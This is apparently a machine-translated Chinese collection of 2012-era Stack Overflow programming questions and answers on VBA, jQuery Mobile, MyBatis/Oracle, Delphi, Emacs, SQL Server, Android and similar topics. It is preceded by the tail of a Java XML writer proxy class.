    writer.writeDTD(dtd);
}

@Override
public void writeDefaultNamespace(String namespaceURI)
        throws XMLStreamException {
    writer.writeDefaultNamespace(namespaceURI);
}

@Override
public void writeEmptyElement(String prefix, String localName,
        String namespaceURI) throws XMLStreamException {
    writer.writeEmptyElement(prefix, localName, namespaceURI);
}

@Override
public void writeEmptyElement(String namespaceURI, String localName)
        throws XMLStreamException {
    writer.writeEmptyElement(namespaceURI, localName);
}

@Override
public void writeEmptyElement(String localName) throws XMLStreamException {
    writer.writeEmptyElement(localName);
}

@Override
public void writeEndDocument() throws XMLStreamException {
    writer.writeEndDocument();
}

@Override
public void writeEndElement() throws XMLStreamException {
    writer.writeEndElement();
}

@Override
public void writeEntityRef(String name) throws XMLStreamException {
    writer.writeEntityRef(name);
}

@Override
public void writeNamespace(String prefix, String namespaceURI)
        throws XMLStreamException {
    writer.writeNamespace(prefix, namespaceURI);
}

@Override
public void writeProcessingInstruction(String target, String data)
        throws XMLStreamException {
    writer.writeProcessingInstruction(target, data);
}

@Override
public void writeProcessingInstruction(String target)
        throws XMLStreamException {
    writer.writeProcessingInstruction(target);
}

@Override
public void writeStartDocument() throws XMLStreamException {
    writer.writeStartDocument();
}

@Override
public void writeStartDocument(String encoding, String version)
        throws XMLStreamException {
    writer.writeStartDocument(encoding, version);
}

@Override
public void writeStartDocument(String version) throws XMLStreamException {
    writer.writeStartDocument(version);
}

@Override
public void writeStartElement(String prefix, String localName,
        String namespaceURI) throws XMLStreamException {
    writer.writeStartElement("", localName, namespaceURI);
    if(null != namespaceURI && namespaceURI.length() > 0) {
        String currentDefaultNS = nc.getNamespaceURI("");
        if(!namespaceURI.equals(currentDefaultNS)) {
            writeDefaultNamespace(namespaceURI);
            nc.setDefaultNS(namespaceURI);
        }
    }
}

@Override
public void writeStartElement(String namespaceURI, String localName)
        throws XMLStreamException {
    writer.writeStartElement(namespaceURI, localName);
}

@Override
public void writeStartElement(String localName) throws XMLStreamException {
    writer.writeStartElement(localName);
}

public static class ProxyNameSpaceContext implements NamespaceContext {

    private String defaultNS = "";

    public void setDefaultNS(String ns) {
        defaultNS = ns;
    }

    @Override
    public String getNamespaceURI(String prefix) {
        if("".equals(prefix)) {
            return defaultNS;
        }
        return null;
    }

    @Override
    public String getPrefix(String namespaceURI) {
        return "";
    }

    @Override
    public Iterator<?> getPrefixes(String namespaceURI) {
        return null;
    }

}

} 
```

# ms-access - Do While Loop 没有给我正确的输出字符串

> ID：11955348
> 
> 赞同：2
> 
> 时间：2012-08-14T15:08:18.020
> 
> 标签：ms-access, while-loop, vba, do-while

我正在尝试将名称列表分配给 Access VBA 中的组合框控件。

我的问题是名称的输出字符串不正确。

这是我的代码：

```
Private Sub command186_click()
    Dim firstName As String
    Dim lastName As String
    Dim rst As Object
    Dim rowSourceText As String
    Dim fullName As String

    Set rst = CurrentDb.OpenRecordset("Pool_Contact")

    Do While Not rst.EOF
        firstName = rst("FName").Value
        lastName = rst("LName").Value
        fullName = firstName + " " + lastName
        rst.MoveNext
    Loop

    Forms(FrmDaysAvailable).Controls("Combo202").rowSource = fullName
    Debug.Print fullName
End Sub 
```

我知道错误出现在我的循环内部，其中变量 fullName 被第二个结果覆盖。

如何修复此循环以生成看起来像 fullName ， fullName ， fullName ...

感谢你的帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:20:05.777

这可以简单得多：

```
 Forms(FrmDaysAvailable).Controls("Combo202").rowSource = _
           "SELECT ID, FName & ' ' & LName FROM Pool_Contact" 
```

或者

```
Forms!FrmDaysAvailable.Combo202.rowSource = _
           "SELECT ID, FName & ' ' & LName FROM Pool_Contact" 
```

或者

```
Me.Combo202.rowSource = "SELECT ID, FName & ' ' & LName FROM Pool_Contact" 
```

此外，使用 & not + 连接。加号 (+) 会给您带来空值问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-14T15:19:34.013

您必须将每个项目添加到 ComboBox，而不是只添加最后一个

```
Do While Not rst.EOF
    firstName = rst("FName").Value
    lastName = rst("LName").Value
    fullName = firstName & " " & lastName
    Me!Combo202.AddItem(fullName)
    rst.MoveNext
Loop 
```

你也应该声明`rst`为`DAO.Recordset`不是对象。（您可能必须添加对 DAO dll 的引用）。

或者，您可以将表或查询直接分配给 ComboBox 的行源并完全删除循环

```
Me!Combo202.RowSource = "Pool_Contact" 
```

但是您可以在表单设计器中执行此操作，而根本不需要在 VBA 中执行此操作。如果您需要刷新 ComboBox 的内容，您可以简单地编写

```
Me!Combo202.Requery 
```

注意：我假设这`Forms(FrmDaysAvailable)`是当前的形式。在这种情况下，您可以简单地通过`Me`. 此外，`Controls`集合是表单的默认属性。`Forms(FrmDaysAvailable).Controls("Combo202")`可以简化为`Me("Combo202")`甚至`Me!Combo202`用 VBA 集合访问操作符`!`。

我还建议您给您的 ComboBox（和其他控件）起有意义的名称，例如`cboFullName`. 这使代码更具可读性。我通常会查询以“q”为前缀的同名 ComboBox 对应的查询，`qcboFullName`并将其分配给属性窗口中组合的 RowSource。查询比表具有优势，您可以应用“ORDER BY”并准确选择组合框所需的列。

通常，作为用户选择的结果，您将有一个隐藏的 ID 列（在列宽属性中输入 0）和一个用于显示的字符串列。

```
SELECT PersonID, firstName & ' ' & lastName AS Display
FROM tblPerson
ORDER BY firstName, lastName 
```

# javascript - 强制 jQuery Mobile 更新哈希而不是 AJAX 页面的 URL？

> ID：11955349
> 
> 赞同：2
> 
> 时间：2012-08-14T15:08:20.527
> 
> 标签：javascript, jquery, jquery-mobile, mobile-website

我正在使用 jQuery Mobile 的默认行为，其中我的 href 链接指向我网站上的不同页面。这完全改变了 URL。有没有办法让它更新哈希而不是更改 URL？直接访问时，单独的页面不起作用，因此散列是有意义的（有利于书签）。我也不必担心从那里的相对路径，因为我仍然在我的站点的根目录中。有什么方法可以像对话一样做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:14:17.177

您可以通过设置禁用此`pushStateEnabled`功能`false`。

这是在`mobileinit`事件中完成的。例如：

```
<script type="text/javascript">
$(document).bind("mobileinit", function(){
    $.mobile.pushStateEnabled = false;
});
</script>

<script src="jquery-mobile.js"></script> 
```

请注意，`mobileinit`必须在将 jQuery mobile 包含到页面**之前附加。**有关更多信息，请查看[jQuery Mobile 配置默认文档页面](http://jquerymobile.com/demos/1.1.1/docs/api/globalconfig.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-19T16:08:43.970

对于 jQuery Mobile 1.4.5 版本，我们发现另外需要设置`changePage.defaults.changeHash`和`hashListeningEnabled`参数`false`

例子：

```
<script>
    $(document).bind('mobileinit',function(){
        $.mobile.changePage.defaults.changeHash = false;
        $.mobile.hashListeningEnabled = false;
        $.mobile.pushStateEnabled = false;
    });
</script> 
```

来源： [jquery-mobile/no-hash-tests.html at cb9112abb3acf73abc104051ac318647055b189c · jquery/jquery-mobile · GitHub](https://github.com/jquery/jquery-mobile/blob/cb9112abb3acf73abc104051ac318647055b189c/tests/integration/dialog-extension/no-hash-tests.html#L10)

# java - 如何使用 Oracle DB 在 Spring/mybatis 应用程序中设置默认模式？

> ID：11955353
> 
> 赞同：3
> 
> 时间：2012-08-14T15:08:30.577
> 
> 标签：java, oracle, spring, schema, mybatis

来自 mysql 背景，我可以在连接 url 中设置我想用于所有 sql 查询的默认模式名称。我现在有一个需要访问的 Oracle 数据库。我知道我无法指定要在 URL 中使用的架构，因为用户是正在使用的架构名称。

我意识到我可以使用一行 SQL 代码：

```
ALTER SESSION SET CURRENT_SCHEMA=default_schema 
```

该项目使用[mybatis 2.3.5](http://www.mybatis.org/core/index.html)作为我的 SQL 框架，但我对 mybatis 完全陌生。有没有一种简单的方法来配置mybatis来完成这个？我的应用程序是 Spring 3 应用程序，因此我使用[Spring DataSourceTransactionManager](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/jdbc/datasource/DataSourceTransactionManager.html)来管理我的事务。我认为必须让管理器了解此要求，以确保在创建新连接时发送命令。

我尝试过在线搜索，但我发现的大多数示例都包含在 SqlMaps 中的 sql 查询中的模式名称，我认为这是不好的做法。

在理想情况下，模式名称将是 URL 的一部分，这样我就可以在不接触代码的情况下更改不同环境（例如：dev、test、prod 等）的模式名称（即：仅在 JNDI 中配置/应用程序服务器级别）。如果我可以使用 Spring 配置值来设置它并且我仍然可以使用 JNDI 查找或系统环境属性来检索值，我会很高兴。

谁能指出我正确的方向？

谢谢，

埃里克

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-11-15T07:12:19.067

据我所知，Oracle 中没有选项可以更改您的 URL 以连接到特定的用户模式。

**1) mybatis：**您可以在开始操作之前将当前架构设置为应得的架构。您可以在属性文件中编写规范并从该文件中设置方法的参数。在这种情况下，您无需更改代码即可更改架构。

```
<update id="mySetSchemaMethod" parameterClass="String">
ALTER SESSION SET CURRENT_SCHEMA = ${schemaName}
</update> 
```

**2) 触发器：**如果您仅将此连接用于此特定 java 应用程序，则可以设置客户端事件触发器，以便设置您的 CURRENT_SCHEMA。这一次，您需要更改触发器以管理测试/产品更改。

```
CREATE OR REPLACE TRIGGER Set_Schema_On_Logon
  AFTER LOGON  
  ON MY_SCHEMA  
BEGIN  
  ALTER SESSION SET CURRENT_SCHEMA = MY_TEST_SCHEMA;  
END; 
```

# delphi - 我该如何处理丢失的 LibIntf.pas 文件？

> ID：11955356
> 
> 赞同：0
> 
> 时间：2012-08-14T15:08:39.190
> 
> 标签：delphi, components, toolsapi

我正在尝试重新编译一个旧的 Deplhi 5 项目，但我收到一个致命错误，提示某些文件丢失。

我在 Internet 上找到了大约 20-25 个缺失的组件，但似乎找不到“LibIntf.pas”。我在哪里可以找到或下载这个丢失的文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:19:14.060

如果编译器告诉您缺少*LibIntf.pas*，那么您并没有真正缺少任何东西。你不应该有那个文件。该单元由随 IDE 分发的设计时包提供。使用该单元的代码只能用作另一个设计时包的一部分。要使其编译，您的设计时包应该在其“要求”列表中包含*DesignIDE.dcp 。*

您的许可证禁止您分发 Delphi 的设计时代码。“缺失”包用于执行该规则。*DesignIDE*只能由其他包使用，而不是应用程序，因此如果您的应用程序尝试使用它的任何单元（如*LibIntf*或*DsgnIntf*​​ ），那么编译将失败。您需要将需要这些单元的代码拆分到单独的设计时包中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:23:33.823

1）不要弄错单元和组件。一个单位可以申报一百个组件。所以要清楚你在搜索什么。

2）谷歌。只是谷歌。[http://google.com/search?q=LibIntf.pas](http://google.com/search?q=LibIntf.pas)

第一个链接是俄文，第二个是英文：[http ://delphigroups.info/2/54/173805.html](http://delphigroups.info/2/54/173805.html)

简而言之 - 您没有权限，您应该启用**运行时包**（如果您的项目是 EXE 或 DLL）并包括 designide.bpl（或者是 designide50.bpl？）或将**designide.dcp**添加到项目选项的**必需**部分（如果项目是 DPK）

# mysql - 如何将大于 4k 的查询从 SQL 缓冲区发送到 Emacs 中的 sql-mysql 缓冲区？

> ID：11955360
> 
> 赞同：23
> 
> 时间：2012-08-14T15:08:52.927
> 
> 标签：mysql, linux, emacs, buffer, ipc

我经常在 Emacs 的`sql-mysql`模式下遇到烦恼，我想知道是否有人有解决方案或更好的解决方法。每当我尝试将查询从`sql-mode`缓冲区发送到活动 SQL 进程缓冲区时，该查询不能大于 4k。如果它大于 4k，则似乎插入了某种中断（可能是换行符），这会导致 mysql 解释器在下一行抛出错误。

`sql-mysql`由 实现`sql.el`，并使用该函数`sql-send-region`将查询区域（或整个缓冲区）发送到选定的 SQL 进程缓冲区。`sql-send-region`调用`comint-send-region`，而后者又调用`process-send-region`. 是一个在Emacs 源代码`process-send-region`中调用 的 C 函数。`send_process``src/process.c`

看起来这可能只是 IPC 管道上的 4k 缓冲区产生的限制。由于看起来内核黑客对于改变这个大小是必要的，所以这不是一个很好的答案。

我想我很困惑的是，如果通过管道发送的 SQL 大于 4k，为什么 mysql 客户端无法正确重新组装它。有任何想法吗？

Emacs 版本： GNU Emacs 23.3.1 (x86_64-pc-linux-gnu, GTK+ Version 2.24.10) of 2012-03-25 on allspice，由 Debian 修改

mysql -V：mysql Ver 14.14 Distrib 5.5.24，适用于使用 readline 6.2 的 debian-linux-gnu (x86_64)

Sql Mysql 选项：-A -C -n （注意我已经尝试过使用和不使用 -n（无缓冲），但都没有解决这个问题）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-10T20:52:19.120

我怀疑罪魁祸首是 Emacs 的进程通信代码，用于`comint`分配 PTY 与进程通信。虽然这些对于交互式工作很有用，因为它们允许作业控制，但它们也受到限制，它们可以在一个块中传输多少数据而无需插入换行符。也可以告诉 Emacs 使用没有此限制的管道。

要对此进行测试，请启动一个新的 Emacs、评估`M-: (setq process-connection-type nil)`和启动`sql-mysql`。如果问题消失了，这就是你的罪魁祸首。在这种情况下，您将需要使用以下内容：

```
(add-hook 'sql-mysql-mode-hook
          (lambda ()
            (set (make-local-variable 'process-connection-type) nil))) 
```

确保`process-connection-type`仅在 MySQL 交互缓冲区中重置。

* * *

**编辑**

根据[http://tinyurl.com/car439o/](http://tinyurl.com/car439o/)，Emacs 不再费心用换行符+EOF 对中断长 PTY 输出。虽然提交是从 2010 年 4 月 13 日开始的，但它只出现在 2012 年发布的 Emacs 24 中。这可以解释为什么该问题在 24.2.1 中显然无法重现。如果您使用的是 24 之前的 Emacs，请尝试升级。

# flash - 无法让闪存使用外部文件

> ID：11955364
> 
> 赞同：0
> 
> 时间：2012-08-14T15:08:59.237
> 
> 标签：flash, csv

我正在尝试编写一个 Flash 程序（使用 CS6 和 AS3），它将为我的公司从外部 .csv 提取数据（以便有人可以更改 .csv 以每天更改输出）。

我发现它在 Flash Creator 中工作得非常好，但如果我将它发布到 .swf，它会引发安全错误。

我发现您必须在浏览器中访问网页并手动允许特定文件。不幸的是，这个程序最终将存在于一个网站上，当我们将它上传到该网站时它因为这个原因它不起作用所以我的问题是：

有没有办法在网页上进行手动允许（我们确实可以访问服务器，或者是否有另一种方法允许 .swf 通过 Internet 访问外部文件（.csv 在线存储）？

如果它是相关的，我正在使用 URLLoader 来检索数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T17:05:51.230

您是否可以控制托管 CSV 文件的 Web 服务器？一个适当的 crossdomain.xml 应该让您的 Flash 代码访问该文件。

就个人而言，我只会编写一个 PHP 脚本或设置 mod_proxy 以在服务器端获取文件，从而完全避免客户端跨域问题。

# ruby - Nokogiri 中的 Ruby Hpricot 是什么？

> ID：11955365
> 
> 赞同：0
> 
> 时间：2012-08-14T15:09:01.723
> 
> 标签：ruby, hpricot

我正在尝试更改 ruby​​ 脚本以使其更易于移植。不幸的是，在 MS Windows 上安装 hpricot 似乎有点复杂，我想避免它。然而，我的红宝石技能很少（或更少）。如何用 Nokogiri 替换它？

```
htmlText = Net::HTTP.get URI.parse("#{ARGV.shift}?type=embed")
html = Hpricot( htmlText ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:11:50.513

有了这个

```
doc = Nokogiri::HTML(open("#{ARGV.shift}?type=embed")) 
```

来自[http://nokogiri.org/](http://nokogiri.org/)

# javascript - 使用 mouseover 和 mouseout 更改背景颜色

> ID：11955367
> 
> 赞同：0
> 
> 时间：2012-08-14T15:09:08.457
> 
> 标签：javascript, jquery, html, menu, navigation

我正在搞乱这个[滚动菜单](http://www.queness.com/resources/html/scrollmenu/index.html)，我希望每个菜单都`li`更改为不同的颜色而不是相同的颜色。

```
var colorOver = '#31b8da';
var colorOut = '#1f1f1f'; 
```

但这会改变所有人的颜色。

html 看起来像这样：

```
<div id="sidebar">
    <ul id="menu">
        <li id="first"><a href="#">blog <span> / 2012</span></a></li>
        <li id="second"><a href="#">me <span> / 2012</span></a></li>
        <li id="third"><a href="#">etc <span> / 2012</span></a></li>
        <li id="fourth"><a href="#">etc <span> / 2012</span></a></li>
        </ul>
    </div> 
```

我假设你只是告诉它`id`...

希望我已经提供了足够的信息。

谢谢你的帮助。

[链接到演示和下载](http://www.queness.com/post/256/vertical-scroll-menu-with-jquery-tutorial)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:17:14.403

您可以修改您的 css 为每个 li 设置 colorOver 和 colorOut 类，例如：

```
.first.colorOver { background-color: #31b8da; } 
.first.colorOut { background-color: #1f1f1f; } 
```

并使用 Francois Wahl 的 toggleClass 选项：

```
 $("#sidebar ul#menu li").on("hover", function(){
     $(this).toggleClass("colorOver", "colorOut");
 }); 
```

然后您可以轻松地为每个 li 设置颜色。

# sql - 如何使用 Select 语句编辑 SQL 记录

> ID：11955368
> 
> 赞同：-2
> 
> 时间：2012-08-14T15:09:09.800
> 
> 标签：sql, sql-server, sql-server-2008

我得到了大约 2000 行数据，当我执行 select 语句时，我可以缩小查询范围，但我无法更改任何值，因为我必须更改 50 列，我不想使用更新命令，因为我必须为每个值更新行是唯一的。

任何人都知道使用 select 命令选择数据然后对其进行编辑的任何更简单的方法。

**编辑**

我刚刚去了 SQL 管理工作室，单击我正在处理的 DB，然后找到该表，我右键单击它，然后它说“选择前 1000 行”，所以现在我可以看到查询和数据，我添加了“在哪里" 进入查询并得到我想要的，但我无法修改下面的表格行：S

**编辑 2 **

或者我可以开发一个实用程序，它将采用表名、列名及其新值并简单地更新它:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T15:16:37.850

在查询窗口中使用`UPDATE`语句（带有子句）修改数据。`WHERE`虽然 Management Studio 有一个名为“编辑前 n 行”的功能，但这并不意味着使用它是一个好主意 - 即使在 SQL Server 2012 版本中，仍有几个行为错误仍未解决，它还可以放置不必要的和基础表上的禁止锁。

我知道这不是您想听到的答案，但请熟悉正确的 DML 命令。的文档`UPDATE`可在此处找到：

[http://msdn.microsoft.com/en-us/library/ms177523(v=sql.100).aspx](http://msdn.microsoft.com/en-us/library/ms177523(v=sql.100).aspx)

`SELECT`总而言之，恕我直言：如果您可以使用with子句识别要更新的行`WHERE`，您也可以`UPDATE`使用相同的子句编写查询`WHERE`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-14T15:20:36.457

在 SSMS 中 - 在您看到“选择前 1000 行”的同一位置，应该有另一个选项“打开表”或“编辑前 200 行”（默认情况下）。

如果您在桌子上执行此操作，请按以下按钮：

![在此处输入图像描述](../Images/4be7d6502a4a94d5a8c197d82bad0e1d.png)

然后，您应该能够粘贴您已经编写的选择语句而不是那里的内容，然后按执行按钮（红色感叹号按钮）。出现的网格*是*可编辑的。

一般来说，我倾向于同意@AaronBertrand，但最好自己学习`Update`语句的语法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:20:56.987

如果你有 Microsoft Access，你可以创建一个链接到你的 sql server 数据库的表，并通过打开表和修改相关行来编辑它。您可以在 Microsoft Access 中创建查询以及限制要返回的行，然后可以内联编辑要在结果集中更改的列。

例如，请参见[此处](http://www.mssqltips.com/sqlservertip/1480/configure-microsoft-access-linked-tables-with-a-sql-server-database/)如何创建到 SQL Server 的链接表。

# google-apps-script - 在 DocsList 类中使用 makeCopy() 方法时出错（在谷歌应用程序脚本中）

> ID：11955370
> 
> 赞同：0
> 
> 时间：2012-08-14T15:09:15.833
> 
> 标签：google-apps-script

我正在尝试使用应用脚本（见下文）在 Google 驱动器中复制文件（Google 演示文稿）。但是，当我执行小脚本时，会弹出以下消息：

> 文件 Pres123 New 必须首先转换为 Google 文档。（第 3 行）

有人对我做错了什么有提示吗？

```
function myFunction() { <br>
  var blafile = DocsList.getFileById("11lyU7q7TjPl89Ryjl_rU9YAZnGBCfSiRyxWlZfvOF-E"); <br>
  var newfile = blafile.makeCopy(); <br>
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:35:53.523

这是一个[已知问题](http://code.google.com/p/google-apps-script-issues/issues/detail?id=874)，复制文件仅适用于文档和电子表格。您应该为该问题加注*星*标以跟踪更新并为它投票。

# .net - 从 FreeTextBox 中去除不间断空格

> ID：11955373
> 
> 赞同：0
> 
> 时间：2012-08-14T15:09:20.517
> 
> 标签：.net, regex, freetextbox

我以前没有遇到过这个问题，我很困惑。使用 FTB 并且无法找到将不间断空格 ( `&nbsp;`) 从文本条目中删除的方法`sql2008r2`。我已经用常规文本框和文本区域做了很多很多次，但这让我完成了。我`replace(string,"&nbsp;","")`在页面上尝试了简单但没有运气，但更喜欢使用正则表达式。而且，这些都不起作用：

```
Regex.Replace(endStr, "(Â){1,999}", "", RegexOptions.IgnoreCase);

Regex.Replace(endStr, "(&nbsp;){1,999}", "", RegexOptions.IgnoreCase); 
```

* * *

没关系，发现这个并且效果很好：

```
Regex.Replace(endStr, "\s+", " ",  RegexOptions.IgnoreCase); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T12:52:21.360

如果您的文本框要处理亚洲语言，\p{Z}+ 应该会更好，因为它们的间距字符与标准 Unicode 值不同。

# c# - C# XNA 无法自动检测哪个导入器用于“AceBackground.xnb”

> ID：11955375
> 
> 赞同：2
> 
> 时间：2012-08-14T15:09:24.747
> 
> 标签：c#, xna, xna-4.0

xna 游戏工作室，出现以下错误

无法自动检测要为“AceBackground.xnb”使用哪个导入器。

没有处理这种文件类型的进口商。在您的项目中指定处理此文件类型的导入器。

问候，

# knockout.js - 将 foreach 与源之外的另一个集合映射

> ID：11955376
> 
> 赞同：0
> 
> 时间：2012-08-14T15:09:25.073
> 
> 标签：knockout.js

我需要翻译一段文字。

这是我的语言数组

```
[
   {iso:"fr",name:"French"},
   {iso:"en",name:"English"},
   {iso:"de",name:"German"},
] 
```

我的模型

```
{
   translation :
   [
      {iso:"fr",content:"Bonjour"},
      {iso:"en",content:"Hello"}
   ]
} 
```

我想要一个显示所有语言的表单，我的映射将填充我的翻译模型。

你知道我怎么能用淘汰赛做到这一点吗？或者有什么办法接近那个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T08:36:54.403

我不太确定您想要实现什么，但我想您想根据所选语言更改翻译。

您可以使语言成为可观察的数组。使所选语言成为可观察的属性。使翻译成为计算属性，该属性根据 SelectedLanguageProperty 返回所需的翻译。

看看这个例子：http: [//jsfiddle.net/dtiemstra/gejde/2/](http://jsfiddle.net/dtiemstra/gejde/2/)

# c - 检查 iso_c_binding 在编译时是否可用

> ID：11955378
> 
> 赞同：5
> 
> 时间：2012-08-14T15:09:29.340
> 
> 标签：c, preprocessor, fortran, fortran-iso-c-binding

在混合 C/Fortran 应用程序的上下文中，有没有办法检查编译器是否知道“iso_c_binding”（例如 GCC 4.1.2 不知道，而 4.3.4 知道），如预处理指令或者其他的东西？我不能简单地检查 GCC 的版本，因为我可能会使用其他编译器。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-15T09:24:27.280

我能想到的唯一两个选择是`iso_c_binding`为没有此模块的系统推出您自己的版本（[如@HighPerformanceMark 建议的那样](https://stackoverflow.com/a/11956651/623518)）或使用预处理器根据编译器版本有条件地编译部分代码。在这两种情况下，您都必须努力确保您的代码可跨系统移植。正如@HighPerformanceMark 所建议的，您可以复制并粘贴 的开源实现`iso_c_binding`，但是对于您将代码移植到的每个新系统，您都必须检查此实现是否正确。

根据您希望代码在*不可*`iso_c_binding`用时的行为方式，我建议使用预处理器方法。您说“我不能简单地检查 GCC 的版本，因为我可能会使用其他编译器”。但是，您的所有选项都需要您自己维护代码以在不同系统上使用，在我看来，预处理器方法需要最少的工作量。

 *以下代码使用预处理器确定编译器版本，并可用于根据编译器版本是否满足某个最低版本来有条件地编译您的代码。对于[gfortran](http://gcc.gnu.org/onlinedocs/gfortran/Preprocessing-and-conditional-compilation.html#Preprocessing-and-conditional-compilation)：

> 如果 GNU Fortran 调用预处理器，`__GFORTRAN__`则定义和`__GNUC__`,`__GNUC_MINOR__`和`__GNUC_PATCHLEVEL__`可用于确定编译器的版本。

在一个文件中，假设`precomp.inc`我将包含一些预编译器检查，这些检查确定要在您的代码中包含哪些功能。例如，我会检查编译器版本，如果它支持使用`iso_c_binding`模块，我会定义一个预处理器宏`HAS_ISO_C_BINDING`（或类似的）。`precomp.inc`然后可以将该文件包含在代码的其他部分中。该文件可能类似于：

```
!> \file precomp.inc
!! Preprocessor feature detection.

#if defined(__GFORTRAN__)

#if __GNUC__ >= 4 && __GNUC_MINOR__ >= 3
#define HAS_ISO_C_BINDING 1
#else
#define HAS_ISO_C_BINDING 0
#endif

#elif defined(__INTEL_COMPILER)
#error "I haven't implemented this yet..."

#else
#error "Compiler not yet supported."

#endif 
```

如果您希望能够在不支持 iso_c_binding 模块的情况下进行编译，则可以将最后一个`#else`子句中的错误替换为 。`HAS_ISO_C_BINDING=0`

您的 Fortran 源代码看起来像

```
program main

#include 'precomp.h'
#if HAS_ISO_C_BINDING
use iso_c_binding
#endif

implicit none

! Some code...

#if HAS_ISO_C_BINDING
! Code which depends on iso_c_binding
#else
! Fallback code
#end if

! Some more code...

end program main 
```

同样，使用正确的方法取决于如果`iso_c_binding`不可用，您希望如何编写代码进行编译。如果您的代码需要在没有此模块的系统上编译，那么@HighPerformanceMark 的答案可能会更好。如果您可以在编译时引发错误，或者如果您有一些后备代码`iso_c_binding`不可用，那么我将使用此预处理器方法，因为这只需要为您需要使用的每个新编译器添加一个额外的检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T23:17:44.650

这个问题被误导了。实际上，您要问的是配套的 Fortran 处理器（假设它存在）是否支持您的 C 程序要求的 C 互操作性的必要方面。C 互操作性不仅仅是一个内在模块的存在。

例如，F2003 处理器提供一个 ISO_C_BINDING 是完全合法的，它表明几乎所有方面的 C 互操作性都不受支持（C_FLOAT、C_REAL 等常量可能具有负值，表示“不支持”）。

因此，除非您对 C 互操作性的使用非常基本（F2003 处理器必须支持某些方面 - 例如 C_INT、C_LOC、C_F_POINTER 等），否则确定功能的唯一实用方法是：

*   编译一个明确使用所需实体并测试其值的小型 Fortran 程序（不同的负数解释了 Fortran 处理器不提供支持的原因）。正如其他人所写的那样，编译的成功或失败，以及编译成功后的后续程序输出，可用于配置构建的其他方面。

*   阅读 Fortran 处理器手册。*

# java - Android膨胀多个微调器会导致奇怪的选择行为

> ID：11955382
> 
> 赞同：1
> 
> 时间：2012-08-14T15:09:32.967
> 
> 标签：java, android, spinner, android-inflate

在程序中，我给几个 Spinner 充气并将它们添加到布局中。对于每个微调器，我都会进行单独的选择。如果 Activity 像往常一样创建，这很好用——所以每个微调器都有自己的选择。如果活动是由于旋转而创建的，它会将最后一个微调器的值应用于所有微调器，我看到一个 onItemSelectedListener 将被多次调用。我非常绝望，因为这对我来说似乎不太合乎逻辑。这是代码：

SpinnerTesterActivity.xml

```
public class SpinnerTesterActivity extends Activity {
    public String[] array={"s0","s1","s2","s3","s4","s5","s6","s7","s8","s9"};

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        Log.d("SPINNERTESTER", "REPAINT ACTIVITY");
        LinearLayout layout=(LinearLayout)this.findViewById(R.id.parentLayout);

        for (int i = 0 ; i<3; i++){
            LayoutInflater layoutInflater = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            ViewGroup reminderLayout = (ViewGroup) layoutInflater.inflate(R.layout.edit_item, null);
            Spinner spinner = (Spinner) reminderLayout.findViewById(R.id.spinner);
            spinner.setAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, array));
            spinner.setSelection(i);

            layout.addView(reminderLayout);

        }
    } 
```

主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:id="@+id/parentLayout" >
</LinearLayout> 
```

编辑项目.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:paddingBottom="3dip"
    android:paddingTop="3dip" >

    <Spinner
        android:id="@+id/spinner"
        android:layout_width="0px"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:gravity="center" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:13:58.967

我相信默认的保存和恢复功能通过其 ID 识别每个视图，因为您所有的 Spinner 都具有相同的 ID，它们接收相同的数据。只需给 Spinners 自己的 id，即使是这样的通用 id：

```
spinner.setId(i); 
```

* * *

其他几个要点：

1.  您的布局 edit_item.xml 有一个只有一个孩子的 LinearLayout，这是不必要的。只需使用 Spinner 作为根元素：

    ```
    <Spinner
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/spinner"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" /> 
    ```

2.  您在每个循环中获取 LayoutInflater，您只需执行一次。

全部一起：

```
 LayoutInflater layoutInflater = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    LinearLayout layout=(LinearLayout)this.findViewById(R.id.parentLayout);

    for (int i = 0 ; i<3; i++){
        Spinner spinner = (Spinner) layoutInflater.inflate(R.layout.spinner, null);
        spinner.setAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, array));
        spinner.setId(i);
        spinner.setSelection(i);

        layout.addView(spinner);
    } 
```

希望有帮助！

# ruby-on-rails - 创建新应用时出错

> ID：11955385
> 
> 赞同：1
> 
> 时间：2012-08-14T15:10:07.807
> 
> 标签：ruby-on-rails, rvm

环境 - rvm ruby​​ - rubies/ruby-1.9.3-p194/bin/ruby

